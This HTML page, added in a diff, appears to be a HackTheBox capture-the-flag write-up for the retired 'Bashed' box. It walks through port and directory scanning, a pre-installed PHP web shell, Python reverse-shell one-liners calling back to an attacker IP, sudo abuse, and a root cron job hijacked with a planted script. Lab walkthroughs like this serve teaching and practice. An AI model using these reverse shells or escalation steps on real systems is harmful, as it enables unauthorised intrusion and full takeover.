@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <writeup>
+        <h1><strong>hackthebox Bashed</strong></h1>
+        <em>Released: 9th December 2017 / Pwned: 16th September 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Bashed makes use a a php shell created by the box's creator - Arrexel. From the web shell, you use python to elevate to a user shell, to a scriptmanager shell using sudo, and then to a root shell by creating a python script in <code>/scripts</code> which runs as root.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -T4 -sV -sC -O -oN nmap/tcp_top1000.txt 10.10.10.68</code><br>
+        <br>
+        -T4 aggressive scan<br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bashed#&nbsp;nmap&nbsp;-p&nbsp;80&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp_top1000.txt&nbsp;10.10.10.68<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Arrexel's&nbsp;Development&nbsp;Site<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Linux&nbsp;3.12&nbsp;(95%),&nbsp;Linux&nbsp;3.13&nbsp;(95%),&nbsp;Linux&nbsp;3.16&nbsp;(95%),&nbsp;Linux&nbsp;3.18&nbsp;(95%),&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9&nbsp;(95%),&nbsp;Linux&nbsp;3.8&nbsp;-&nbsp;3.11&nbsp;(95%),&nbsp;Linux&nbsp;4.4&nbsp;(95%),&nbsp;Linux&nbsp;4.2&nbsp;(95%),&nbsp;Linux&nbsp;4.8&nbsp;(95%),&nbsp;ASUS&nbsp;RT-N56U&nbsp;WAP&nbsp;(Linux&nbsp;3.4)&nbsp;(95%)<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(test&nbsp;conditions&nbsp;non-ideal).<br>
+                Network&nbsp;Distance:&nbsp;2&nbsp;hops
+            </div>
+        </div><br>
+        <br>
+        Results analysis:<br>
+        • Port 80 - The only place to look!<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        Visit <code>http://10.10.10.68</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        There's a link to a blog post titled <code>phpbash</code>.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <code>phpbash</code> appears to be a php web shell written by the box's creator- Arrexel.<br>
+        Follow the github link to read more about it (it's actually really good).<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) 80/http - Gobuster</strong></h3><br>
+        If you <code>gobuster</code> the site, you'll find a <code>/dev</code> directory which already contains a <code>phpbash.php</code> shell for us.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bashed/80#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.68&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb-big.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.68/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/09/16&nbsp;14:16:09&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.68/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.68/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.68/css&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.68/dev&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.68/fonts&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.68/images&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.68/js&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.68/php&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.68/server-status&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.68/uploads&nbsp;(Status:&nbsp;301)<br>
+                =====================================================<br>
+                2019/09/16&nbsp;14:17:20&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) www-data Interactive Shell</strong></h2><br>
+        We're running as <code>www-data</code>, but you can grab <code>user.txt</code> from <code>arrexel</code>'s home directory.<br>
+            <div class="codebox">
+                www-data@bashed:/var/www/html/dev#&nbsp;whoami<br>
+                www-data<br>
+                www-data@bashed:/var/www/html/dev#&nbsp;ls&nbsp;-alh&nbsp;/home<br>
+                total&nbsp;16K<br>
+                drwxr-xr-x&nbsp;4&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Dec&nbsp;4&nbsp;2017&nbsp;.<br>
+                drwxr-xr-x&nbsp;23&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Dec&nbsp;4&nbsp;2017&nbsp;..<br>
+                drwxr-xr-x&nbsp;4&nbsp;arrexel&nbsp;arrexel&nbsp;4.0K&nbsp;Dec&nbsp;4&nbsp;2017&nbsp;arrexel<br>
+                drwxr-xr-x&nbsp;3&nbsp;scriptmanager&nbsp;scriptmanager&nbsp;4.0K&nbsp;Dec&nbsp;4&nbsp;2017&nbsp;scriptmanager<br>
+                www-data@bashed:/var/www/html/dev#&nbsp;ls&nbsp;-alh&nbsp;/home/*/*<br>
+                -r--r--r--&nbsp;1&nbsp;arrexel&nbsp;arrexel&nbsp;33&nbsp;Dec&nbsp;4&nbsp;2017&nbsp;/home/arrexel/user.txt<br>
+                www-data@bashed:/var/www/html/dev#&nbsp;cat&nbsp;/home/arrexel/user.txt<br>
+                2c281f31...
+            </div>
+        </div><br>
+        <br>
+        Check what commands <code>www-data</code> can run with <code>sudo</code><br>
+            <div class="codebox">
+                www-data@bashed:/var/www/html/dev#&nbsp;sudo&nbsp;-l<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;for&nbsp;www-data&nbsp;on&nbsp;bashed:<br>
+                env_reset,&nbsp;mail_badpass,&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>
+                <br>
+                User&nbsp;www-data&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;bashed:<br>
+                (scriptmanager&nbsp;:&nbsp;scriptmanager)&nbsp;NOPASSWD:&nbsp;ALL
+            </div>
+        </div><br>
+        <br>
+        This sudo entry allows us (<code>www-data</code>) to run <code>ALL</code> commands as <code>scriptmanager</code> without providing a password.<br>
+        <br>
+        You can do a lot in this shell, but because it's not interactive, you can't run <code>sudo</code>.<br>
+        In that case, you can elevate to an interactive shell using a python<br>
+        <br>
+        First, send a python reverse shell to your attacking system<br>
+        Second, elevate to an interactive shell by using python to spawn a bash shell.<br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bashed#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And on the web shell, send a python reverse shell back to your listener.<br>
+        <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code><br>
+        <br>
+        You should receive a shell as <code>www-data</code><br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.6]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.68]&nbsp;40406<br>
+                /bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;whoami<br>
+                www-data
+            </div>
+        </div><br>
+        <br>
+        Now spawn an interactive shell using <code>python -c 'import pty; pty.spawn("/bin/bash")'</code><br>
+        With this interactive shell, you can finally run <code>sudo</code><br>
+            <div class="codebox">
+                $&nbsp;python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                www-data@bashed:/var/www/html/dev$&nbsp;sudo&nbsp;-u&nbsp;scriptmanager&nbsp;id<br>
+                sudo&nbsp;-u&nbsp;scriptmanager&nbsp;id<br>
+                uid=1001(scriptmanager)&nbsp;gid=1001(scriptmanager)&nbsp;groups=1001(scriptmanager)
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Elevate to scriptmanager</strong></h2><br>
+        Now that you're on an interactive shell, you can run <code>sudo -u scriptmanager /bin/bash</code> to elevate to <code>scriptmanager</code><br>
+            <div class="codebox">
+                www-data@bashed:/var/www/html/dev$&nbsp;sudo&nbsp;-u&nbsp;scriptmanager&nbsp;id<br>
+                sudo&nbsp;-u&nbsp;scriptmanager&nbsp;/bin/bash<br>
+                scriptmanager@bashed:/var/www/html/dev$&nbsp;whoami<br>
+                whoami<br>
+                scriptmanager
+            </div>
+        </div><br>
+        <br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) /scripts</strong></h2><br>
+        Now that we're <code>scriptmanager</code>, we can access <code>scriptmanager</code>'s files.<br>
+        <br>
+        You can either list all files that scriptmanager owns - <code>find / -user scriptmanager 2&gt;/dev/null</code> - or use a bit of logical thinking to advance. My brain was asleep, so I did the logical thinking path.<br>
+        <br>
+        If this user is called <code>scriptmanager</code>, there must be scripts that need managing somewhere.<br>
+        In <code>/</code>, the root of the file system, you'll find <code>/scripts</code>.<br>
+        <br>
+            <div class="codebox">
+                scriptmanager@bashed:/scripts$&nbsp;ls&nbsp;-alh<br>
+                ls&nbsp;-alh<br>
+                total&nbsp;16K<br>
+                drwxrwxr--&nbsp;&nbsp;2&nbsp;scriptmanager&nbsp;scriptmanager&nbsp;4.0K&nbsp;Sep&nbsp;16&nbsp;07:02&nbsp;.<br>
+                drwxr-xr-x&nbsp;23&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Dec&nbsp;&nbsp;4&nbsp;&nbsp;2017&nbsp;..<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;scriptmanager&nbsp;scriptmanager&nbsp;&nbsp;&nbsp;58&nbsp;Dec&nbsp;&nbsp;4&nbsp;&nbsp;2017&nbsp;test.py<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12&nbsp;Sep&nbsp;16&nbsp;07:02&nbsp;test.txt<br>
+                scriptmanager@bashed:/scripts$&nbsp;cat&nbsp;test.py&nbsp;<br>
+                cat&nbsp;test.py<br>
+                f&nbsp;=&nbsp;open("test.txt",&nbsp;"w")<br>
+                f.write("testing&nbsp;123!")<br>
+                f.close<br>
+                scriptmanager@bashed:/scripts$&nbsp;cat&nbsp;test.txt<br>
+                cat&nbsp;test.txt<br>
+                testing&nbsp;123!
+            </div>
+        </div><br>
+        <br>
+        <code>test.py</code> creates a file called <code>test.txt</code>, and writes <code>testing 123!</code> in it.<br>
+        <code>test.txt</code> is owned by root, which means that <code>test.py</code> must run as root.<br>
+        <br>
+        In that case, there must be a cronjob which runs python files in this directory.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>5a) Python Reverse Shell</strong></h3><br>
+        To get root, you can write your own python script which sends a reverse shell to your attacking machine. Because the script runs as root, you'll be sent a root shell.<br>
+        <br>
+        Start a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bashed#&nbsp;nc&nbsp;-lvnp&nbsp;9003<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Write a python script which sends a shell back to your listener.<br>
+        Because we're not a real/proper interactive shell, you'll have to echo the lines into the script.<br>
+        <br>
+        One-liner script<br>
+        <code>echo "'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.6',9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'" &gt; shellme.py</code><br>
+        <br>
+        Or echo as separate lines<br>
+            <div class="codebox">
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"import&nbsp;socket,subprocess,os"&nbsp;&gt;&nbsp;shellme.py<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)"&nbsp;&gt;&gt;&nbsp;shellme.py<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"s.connect(('10.10.14.6',&nbsp;9003))"&nbsp;&gt;&gt;&nbsp;shellme.py<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"os.dup2(s.fileno(),0)"&nbsp;&gt;&gt;&nbsp;shellme.py<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"os.dup2(s.fileno(),1)"&nbsp;&gt;&gt;&nbsp;shellme.py<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"os.dup2(s.fileno(),2)"&nbsp;&gt;&gt;&nbsp;shellme.py<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"p&nbsp;=&nbsp;subprocess.call(['/bin/bash','-i'])"&nbsp;&gt;&gt;&nbsp;shellme.py&nbsp;&nbsp;&nbsp;<br>
+                scriptmanager@bashed:/scripts$&nbsp;echo&nbsp;"os.system('touch&nbsp;shellsent')"&nbsp;&gt;&gt;&nbsp;shellme.py
+            </div>
+        </div><br>
+        <br>
+        My final script looked like this:<br>
+            <div class="codebox">
+                scriptmanager@bashed:/scripts$&nbsp;cat&nbsp;shellme.py<br>
+                import&nbsp;socket,subprocess,os<br>
+                s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br>
+                s.connect(('10.10.14.6',&nbsp;9003))<br>
+                os.dup2(s.fileno(),0)<br>
+                os.dup2(s.fileno(),1)<br>
+                os.dup2(s.fileno(),2)<br>
+                p&nbsp;=&nbsp;subprocess.call(['/bin/bash','-i'])
+            </div>
+        </div><br>
+        <br>
+        Watch your listener and wait for a connection.<br>
+        You should get a root shell :)<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9003&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.6]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.68]&nbsp;41328<br>
+                bash:&nbsp;cannot&nbsp;set&nbsp;terminal&nbsp;process&nbsp;group&nbsp;(9830):&nbsp;Inappropriate&nbsp;ioctl&nbsp;for&nbsp;device<br>
+                bash:&nbsp;no&nbsp;job&nbsp;control&nbsp;in&nbsp;this&nbsp;shell<br>
+                root@bashed:/scripts#&nbsp;id<br>
+                id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)
+            </div>
+        </div><br>
+        <br>
+        Go grab root.txt<br>
+            <div class="codebox">
+                root@bashed:/scripts#&nbsp;cat&nbsp;/root/root.txt<br>
+                cat&nbsp;/root/root.txt<br>
+                cc4f0afe3...
+            </div>
+        </div><br>
+    </writeup>
+</section>
+
+</body>
+</html>
